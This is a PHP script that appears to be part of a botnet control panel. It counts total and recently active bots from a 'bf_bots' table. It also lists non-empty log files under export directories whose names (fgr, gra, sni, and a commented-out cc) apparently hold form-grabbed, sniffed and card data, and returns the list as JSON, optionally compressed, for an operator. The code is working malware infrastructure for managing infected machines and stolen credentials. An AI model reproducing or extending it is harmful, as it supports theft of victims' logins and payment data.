
function get_dirs($dir_src, $not_select = '', $not_select2 = ''){
	global $dir;
	$result = array();
	$dr = array();
	$dr[0] = scandir(realpath($dir_src));
	foreach($dr[0] as $d1){
		if($d1 != '.' && $d1 != '..' && $d1 != '.htaccess' && $d1 != $not_select && $d1 != $not_select2){
			if(is_dir(realpath($dir_src . '/' . $d1))){
				$dr[1] = scandir(realpath($dir_src . '/' . $d1 . '/'));
				foreach($dr[1] as $d2){
					if($d2 != '.' && $d2 != '..'){
						if(is_dir(realpath($dir_src . '/' . $d1 . '/' . $d2))){
							$dr[2] = scandir(realpath($dir_src . '/' . $d1 . '/' . '/' . $d2 . '/'));
							foreach($dr[2] as $d3){
								if($d3 != '.' && $d3 != '..' && $d3 != '.htaccess' && $d3 != $not_select && $d3 != $not_select2){
									$tmp = @array();
									$tmp['file'] = str_replace('//', '/', $dir_src . '/' . $d1 . '/' . $d2 . '/' . $d3);
									$tmp['file'] = str_replace($dir, '/', $tmp['file']);
									$tmp['size'] = @filesize(realpath($dir_src . '/' . $d1 . '/' . $d2 . '/' . $d3));
									if($tmp['size'] > 0){
										$result[] = $tmp;
									}
								}
							}
						}else{
							if($d2 != '.htaccess' && $d2 != $not_select && $d2 != $not_select2){
								$tmp = @array();
								$tmp['file'] = str_replace('//', '/', $dir_src . '/' . $d1 . '/' . $d2);
								$tmp['file'] = str_replace($dir, '/', $tmp['file']);
								$tmp['size'] = @filesize(realpath($dir_src . '/' . $d1 . '/' . $d2));
								if($tmp['size'] > 0){
									$result[] = $tmp;
								}
							}
						}
					}
				}
			}else{
				$tmp = @array();
				$tmp['file'] = str_replace('//', '/', $dir_src . '/' . $d1);
				$tmp['file'] = str_replace($dir, '/', $tmp['file']);
				$tmp['size'] = @filesize(realpath($dir_src . '/' . $d1));
				if($tmp['size'] > 0){
					$result[] = $tmp;
				}
			}
		}
	}
	return $result;
}

$files = array();

if($count_bots == true){
	$r = $mysqli->query("select count(id) count from bf_bots");
	$r = $r->fetch_object();
	$files['count_bots'] = $r->count;

	$r = $mysqli->query("select count(id) count from bf_bots WHERE (last_date > '".(time()-1800)."')");
	$r = $r->fetch_object();
	$files['live_bots'] = $r->count;
}

//$files[1] = get_dirs($dir . 'logs/import/fgr/', date('d.m.Y') . '.txt');
//$files[2] = get_dirs($dir . 'logs/import/gra/', date('d.m.Y') . '.txt');
//$files[3] = get_dirs($dir . 'logs/import/sni/', date('d.m.Y') . '.txt');
//$files[4] = get_dirs($dir . 'logs/import/tra/', date('d.m.Y') . '.txt');

$files[5] = get_dirs($dir . 'logs/export/fgr/', date('d.m.Y_G') . '.txt', date('d.m.Y_G') . '.gz.txt');
$files[6] = get_dirs($dir . 'logs/export/gra/', date('d.m.Y_G') . '.txt', date('d.m.Y_G') . '.gz.txt');
$files[7] = get_dirs($dir . 'logs/export/sni/', date('d.m.Y_G') . '.txt', date('d.m.Y_G') . '.gz.txt');

//$files[8] = get_dirs($dir . 'logs/bots/', date('d.m.Y') . '.txt');

//$files[9] = get_dirs($dir . 'logs/cabs/');

//$files[10] = get_dirs($dir . 'logs/export/cc/', date('d.m.Y_G') . '.txt', date('d.m.Y_G') . '.gz.txt');

if($gzinflate == true){
	print(gzdeflate(json_encode($files), 9));
}else{
	print(json_encode($files));
}
